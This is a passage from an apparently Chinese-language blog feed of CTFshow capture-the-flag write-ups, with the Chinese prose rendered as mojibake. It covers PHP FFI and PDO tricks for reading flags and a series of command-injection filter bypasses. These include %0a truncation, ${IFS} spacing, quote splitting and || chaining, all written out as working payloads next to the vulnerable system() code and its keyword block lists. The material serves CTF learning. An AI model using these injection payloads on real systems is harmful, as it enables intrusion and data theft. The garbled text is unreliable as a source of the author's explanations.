class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dsn</span> = <span class="string">&quot;mysql:host=localhost;dbname=information_schema&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select group_concat(SCHEMA_NAME) from SCHEMATA&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$rs</span> <span class="keyword">as</span> <span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; </span><br><span class="line">&#125;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681290428024-3c729f7a-edc5-4787-a8df-5f0a30f7a678.png" alt="image.png"><br>ç„¶ååœ¨ä½¿ç”¨ä»–æä¾›çš„payloadå°±å¯ä»¥äº†ã€‚</p><h1 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h1><p>æ–‡ä»¶åä¿®æ”¹ä¸ºäº†flag36d.txt<br>ç›´æ¥ç”¨ä¸Šä¸€é“é¢˜çš„payloadè·å–flagå³å¯ã€‚</p><h1 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h1><blockquote><p><a href="https://blog.csdn.net/weixin_44700621/article/details/125381763">https://blog.csdn.net/weixin_44700621/article/details/125381763</a> è¿™ä¸ªå†™çš„æŒºå…¨çš„</p></blockquote><p>è¿˜æ˜¯å…ˆçœ‹æ–‡ä»¶åï¼Œå‘ç°æœ‰ä¸¤ä¸ªå¯ç–‘æ–‡ä»¶ï¼šflag36x.tx tå’Œ readflag<br>é¢˜é‡Œé¢æç¤ºäº†æ˜¯php7.4ã€‚payloadä½¿ç”¨çš„æ˜¯PHP 7.4+çš„FFIç‰¹æ€§ï¼Œå³å¤–éƒ¨å‡½æ•°æ¥å£ç‰¹æ€§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//åˆ›å»ºä¸€ä¸ªsystemå¯¹è±¡</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//æ²¡æœ‰å›æ˜¾çš„</span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="comment">//é€šè¿‡$ffiå»è°ƒç”¨systemå‡½æ•°</span></span><br></pre></td></tr></table></figure><p>ç”±äºæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥è¿™é‡Œè¦æŠŠç»“æœå†™åˆ°1.txté‡Œé¢ã€‚<br>PHPæ‰‹å†Œä¸­å¯¹<code>FFI:cdef</code>åŸå‹çš„æè¿°ä¸º<code>public static FFI::cdef(string $code = &quot;&quot;, ?string $lib = null)</code>ï¼Œå…¶ä¸­$codeä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒåŒ…å«å¸¸è§„Cè¯­è¨€ä¸­çš„ä¸€ç³»åˆ—å£°æ˜ï¼Œ$libä¸ºè¦åŠ è½½å’Œé“¾æ¥çš„å…±äº«åº“æ–‡ä»¶åç§°ï¼Œå¦‚æœçœç•¥libï¼Œåˆ™å¹³å°å°†ä¼šå°è¯•åœ¨å…¨å±€èŒƒå›´å†…æŸ¥æ‰¾ä»£ç ä¸­å£°æ˜çš„ç¬¦å·ï¼Œå…¶ä»–ç³»ç»Ÿå°†æ— æ³•è§£æè¿™äº›ç¬¦å·ã€‚<br><code>int system(const char *command);</code>å³ä¸ºCè¯­è¨€ä¸­systemå‡½æ•°çš„å®šä¹‰ï¼Œç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä¹Ÿå³åœ¨Linuxå¹³å°ä¸‹å°†/readflag &gt; 1.txtä½¿ç”¨shellè¿›è¡Œè§£æå¹¶æ‰§è¡Œï¼Œå› æ­¤çŒœæµ‹readflagå¯èƒ½æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚<br>å› æ­¤ä¹Ÿå¯ä»¥ç”¨è¿™ç§æ–¹æ³•è¯»å–æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;ls / &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681291412242-bd33651d-8eaf-4013-bf26-6ab8ad987bfd.png" alt="image.png"><br>æœ€åçš„è·å–flagçš„payloadå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>åé¢å‡ é“é¢˜åšèµ·æ¥çœŸæ˜¯æŠ½è±¡ä¸­çš„æŠ½è±¡ï¼Œä½†æ˜¯ä¹Ÿç»™äº†æˆ‘å¾ˆå¤šè§†è§’ï¼Œæ„Ÿè§‰æŒºè€³ç›®ä¸€æ–°çš„å°±æ˜¯é‚£ä¸ª73é‡Œé¢å¯¹uafçš„æ–¹æ³•é‡å†™çš„æƒ³æ³•æŒºæ–°å¥‡çš„ï¼Œä¹‹å‰æ²¡æœ‰æƒ³è¿‡ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web42-57å‘½ä»¤æ‰§è¡Œç¯‡ï¼ˆäºŒï¼‰</title>
      <link href="/2023/03/30/web42-57%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/03/30/web42-57%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å˜é‡åé¢æ‹¼æ¥äº†ä¸€å †å­—ç¬¦ä¸²ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆæ€è€ƒè¿™ä¸€ä¸²æ˜¯ä»€ä¹ˆä¸œè¥¿ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;/dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span> </span><br></pre></td></tr></table></figure><p>å°±æ˜¯è®©æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°/dev/nullä¸­ï¼ˆä¸¢å¼ƒæ ‡å‡†è¾“å‡ºï¼‰ï¼Œç„¶åé”™è¯¯è¾“å‡ºç”±äºé‡ç”¨äº†æ ‡å‡†è¾“å‡ºçš„æè¿°ç¬¦ï¼Œæ‰€ä»¥é”™è¯¯è¾“å‡ºä¹Ÿè¢«å®šå‘åˆ°äº†/dev/nullä¸­ï¼Œé”™è¯¯è¾“å‡ºåŒæ ·ä¹Ÿè¢«ä¸¢å¼ƒäº†ã€‚æ‰§è¡Œäº†è¿™æ¡å‘½ä»¤ä¹‹åï¼Œè¯¥æ¡shellå‘½ä»¤å°†ä¸ä¼šè¾“å‡ºä»»ä½•ä¿¡æ¯åˆ°æ§åˆ¶å°ï¼Œä¹Ÿä¸ä¼šæœ‰ä»»ä½•ä¿¡æ¯è¾“å‡ºåˆ°æ–‡ä»¶ä¸­ã€‚<br>å› æ­¤è¿™ä¸ªä¹Ÿè¢«æˆä¸ºæ•°æ®é»‘æ´ï¼ˆè¿˜æ˜¯å¾ˆå½¢è±¡çš„ï¼‰ã€‚<br>è¿™éƒ¨åˆ†çš„bypassæ˜¯åŒå†™ï¼Œè®©åé¢çš„æŒ‡ä»¤ç»“æœè¿›å…¥é»‘æ´ï¼Œä½†æ˜¯ä¿å…¨å‰é¢çš„å‘½ä»¤ã€‚<br>æ¯”å¦‚è¯´ï¼š<code>?c=ls;ls</code>ï¼Œè¿™å°±å‡ºç°äº†è¿è¡Œç»“æœã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678888044280-4977aed2-5019-4f9a-b9f3-7a5f88a08b5d.png" alt="image.png"><br>äºæ˜¯payloadä¹Ÿå°±å¾ˆå®¹æ˜“å¾—åˆ°äº†ï¼š<code>?c=tac flag.php;ls</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678888113737-36ea4c05-f999-4289-b19f-55a8710fc053.png" alt="image.png"></p><h2 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h2><p>å½“ç„¶ç›´æ¥ä½¿ç”¨<code>%0a</code>æˆªæ–­ä¹Ÿå¯ä»¥ï¼Œæ¯”å¦‚ï¼š<code>tac f*%0a</code></p><h2 id="ä»é‡å®šå‘åˆ°é»‘æ´ï¼ˆ-gt-dev-null-2-gt-amp-1ï¼‰"><a href="#ä»é‡å®šå‘åˆ°é»‘æ´ï¼ˆ-gt-dev-null-2-gt-amp-1ï¼‰" class="headerlink" title="ä»é‡å®šå‘åˆ°é»‘æ´ï¼ˆ&gt;/dev/null 2&gt;&amp;1ï¼‰"></a>ä»é‡å®šå‘åˆ°é»‘æ´ï¼ˆ&gt;/dev/null 2&gt;&amp;1ï¼‰</h2><blockquote><p><a href="https://www.cnblogs.com/kexianting/p/11630085.html">https://www.cnblogs.com/kexianting/p/11630085.html</a>ï¼ˆå»ºè®®å¿˜äº†çœ‹è¿™ä¸ªï¼Œå†™çš„å¾ˆå…¨ï¼‰</p></blockquote><p>ä½†æ˜¯æˆ‘ä»¬ä¸èƒ½åªçŸ¥é“è¿™ä¸ªä¸œè¥¿æ˜¯æ˜¯é»‘æ´ï¼Œæˆ‘ä»¬ä¹Ÿè¦æ˜ç™½å…¶ä¸­çš„åŸç†ã€‚<br>å®¹æ˜“çœ‹å‡ºï¼Œä¸Šé¢çš„è¯­å¥åº”è¯¥æ˜¯åˆ†æˆä¸¤æ®µï¼Œå‰ä¸€æ®µæ˜¯ï¼š<code>&gt;/dev/null</code>åä¸€æ®µæ˜¯ï¼š<code>2&gt;&amp;1</code><br>å‰è€…çš„å«ä¹‰æ˜¯å°†è¾“å‡ºç»“æœå®šå‘åˆ°<code>&gt;/dev/null</code>ï¼Œè€Œè¿™ä¸ªåœ°å€è¡¨ç¤ºçš„æ˜¯linuxçš„ç©ºè®¾å¤‡ï¼Œå› æ­¤ä¼šå°†è¿è¡Œç»“æœæ¶ˆç­ã€‚<br>è€Œåè€…ç®€å•è§£é‡Šå°±æ˜¯å°†æ­£ç¡®å’Œé”™è¯¯ä¸¤ä¸ªè¾“å‡ºç»‘å®šåˆ°ä¸€èµ·ï¼Œéƒ½è¾“å‡ºåˆ°åŒä¸€ä¸ªåœ°æ–¹ã€‚ï¼ˆå…¶ä¸­1æŒ‡çš„æ˜¯æ ‡å‡†è¾“å‡ºï¼Œ2æŒ‡çš„æ˜¯é”™è¯¯è¾“å‡ºï¼Œè¯¦ç»†çš„çœ‹å‚è€ƒæ–‡ç« ï¼‰ã€‚</p><h1 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†åˆ†å·ï¼Œä¸èƒ½ç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³•ç»•è¿‡äº†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨<code>%0a</code>ï¼ˆå›è½¦ï¼‰æˆªæ–­ã€‚<br>payloadï¼š<code>tac f*%0a</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679064061206-b7272e00-d5ee-46c4-bb3f-60feec9e1b6b.png" alt="image.png"></p><h1 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?c=tac f*%0a</code></p><h1 id="web45-IFSç»•è¿‡åŸç†è§£æ"><a href="#web45-IFSç»•è¿‡åŸç†è§£æ" class="headerlink" title="web45 IFSç»•è¿‡åŸç†è§£æ"></a>web45 IFSç»•è¿‡åŸç†è§£æ</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤šäº†ä¸€ä¸ªç©ºæ ¼è¿‡æ»¤ï¼Œpayloadä¸­ç®€å•åŠ ä¸€ä¸ª<code>$&#123;IFS&#125;</code>å³å¯ç»•è¿‡ã€‚<br><code>?c=tac$&#123;IFS&#125;f*%0a</code></p><h2 id="å¤‡æ³¨"><a href="#å¤‡æ³¨" class="headerlink" title="å¤‡æ³¨"></a>å¤‡æ³¨</h2><blockquote><p><a href="https://blog.csdn.net/qq_54727981/article/details/125936528">https://blog.csdn.net/qq_54727981/article/details/125936528</a></p></blockquote><p>ä¸€ç›´ä½¿ç”¨IFSæ¥ç»•è¿‡ï¼Œä½†æ˜¯ä¸€ç›´ä¸çŸ¥é“ä»€ä¹ˆæ„æ€ï¼Œäº†è§£äº†ä¸€ä¸‹ï¼š<br><em>$IFS æ˜¯ä¸€ç§ set å˜é‡ï¼Œå½“ shell å¤„ç†â€å‘½ä»¤æ›¿æ¢â€å’Œâ€å‚æ•°æ›¿æ¢â€æ—¶ï¼Œshell æ ¹æ® IFS çš„å€¼ï¼Œé»˜è®¤æ˜¯ space,tab, newline å³ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦ï¼Œç©ºè¡Œæ¥æ‹†è§£è¯»å…¥çš„å˜é‡ï¼Œç„¶åå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œå¤„ç†ï¼Œæœ€åé‡æ–°ç»„åˆèµ‹å€¼ç»™è¯¥å˜é‡ã€‚<br>ç›´æ¥ç”¨$IFSçš„è¯ï¼Œä¼šè®¤ä¸ºè§£ææ²¡ç»“æŸï¼Œä¼šæŠŠåé¢çš„ä¹Ÿå½“åšå‚æ•°è§£æï¼Œæ¯”å¦‚cat$IFSflag.phpï¼Œä¼šæŠŠIFSflagä¸€èµ·å½“å˜é‡è§£æã€‚è¿™æ—¶å€™éœ€è¦åœ¨$IFSåé¢è¿›è¡Œæˆªæ–­ï¼Œä½¿è§£æä¸ºç©ºï¼Œç»“æŸ $IFSï¼Œæ­£å¸¸æ‰§è¡Œåé¢çš„å†…å®¹ã€‚</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS$<span class="number">1</span>flag.php<span class="comment">//ä½¿ç”¨ç‰¹æ®Šå˜é‡</span></span><br><span class="line">cat$&#123;IFS&#125;flag.php<span class="comment">//ä½¿ç”¨&#123;&#125;</span></span><br><span class="line">cat<span class="variable">$IFS</span><span class="string">&#x27;f&#x27;</span>lag.php<span class="comment">//ä½¿ç”¨å¼•å·</span></span><br><span class="line">cat<span class="variable">$IFS</span>\flag.php<span class="comment">//ä½¿ç”¨è½¬ä¹‰ç¬¦</span></span><br><span class="line">cat<span class="variable">$IFS</span>?lag.php<span class="comment">//ä½¿ç”¨é€šé…ç¬¦</span></span><br></pre></td></tr></table></figure><h1 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç©ºæ ¼è¿‡æ»¤è¿˜è¿‡æ»¤äº†ç¾å…ƒç¬¦å·ï¼Œç”¨é€šé…ç¬¦<code>&lt;</code>ç»•è¿‡å³å¯ã€‚flagå’Œ*è¿‡æ»¤ç”¨å•åŒå¼•å·ç»•è¿‡å³å¯ã€‚<br><code>?c=tac&lt;&gt;&#39;f&#39;lag.php%0a</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679066076057-af02fc4a-8fcb-4ffd-92d2-a0a618e12b51.png" alt="image.png"></p><h1 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?c=tac&lt;&#39;f&#39;lag.php%0a</code><br>hintä¸­ç»™çš„æ–¹æ³•æ˜¯è¿™ç§ï¼š<code>nl&lt;fla&#39;&#39;g.php||</code><br>çœ‹æ¥ç®¡é“ç¬¦ä¹Ÿå¯ä»¥æˆªæ–­ï¼Œä½†æ˜¯å°è¯•å°†ç®¡é“ç¬¦æ¢æˆ&amp;å´ä¸è¡Œã€‚å¯èƒ½è¿™é‡Œæˆªæ–­çš„æ˜¯æ–‡æœ¬è€Œä¸æ˜¯å‘½ä»¤ã€‚</p><h1 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç«Ÿç„¶è¿˜æ²¡æœ‰è¿‡æ»¤tac<br><code>?c=tac&lt;&#39;f&#39;lag.php%0a</code></p><h1 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?c=tac&lt;f&#39;&#39;lag.php||</code>ä¸è®©ç”¨%0aï¼Œå°±ç”¨åˆšåˆšåœ¨hintä¸­å­¦åˆ°çš„åŒç®¡é“ç¬¦éš”æ–­ã€‚</p><h1 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?c=tac&lt;f&#39;&#39;lag.php||</code><br>è¿‡æ»¤ä¸­å‡ºç°äº†å¾ˆæœ‰æ„æ€çš„ä¸œè¥¿ï¼š<code>\x09 å’Œ\x26</code>ï¼Œ\xè¡¨ç¤ºåé¢ä¸¤ä½ç”¨åå…­è¿›åˆ¶æ¥è¡¨ç¤ºï¼Œåˆ™å‰é¢ä¸¤å›½çš„ä»£è¡¨asciiç ä¸º9å’Œ26çš„å­—ç¬¦<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679067645206-6016ee60-ecf7-444c-b21f-8aa772e86e2d.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679067671699-e7dac3c6-fcc4-4c21-abc4-ec77d4cec155.png" alt="image.png"><br>æ³¨æ„æ˜¯åå…­è¿›åˆ¶ï¼Œä¸æ˜¯åè¿›åˆ¶ã€‚</p><h1 